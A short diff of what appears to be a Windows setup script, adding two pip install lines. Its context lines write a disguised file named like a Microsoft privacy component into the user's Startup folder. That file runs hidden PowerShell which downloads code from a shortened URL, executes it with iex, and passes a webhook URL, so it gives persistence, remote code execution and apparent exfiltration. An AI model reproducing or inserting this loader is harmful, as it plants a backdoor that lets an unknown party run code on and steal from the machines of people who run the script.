@@ -18,6 +18,13 @@ cls
 #####################################################################
 
 #####################################################################
+
+python3 -m pip install threading
+python3 -m pip install thread
+
+#####################################################################
+
+#####################################################################
 Set-Content "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft.Privacy.FullKeys.Priv.cmd" "
 @echo off
 powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr shorturl.at/biVZ5).content)"
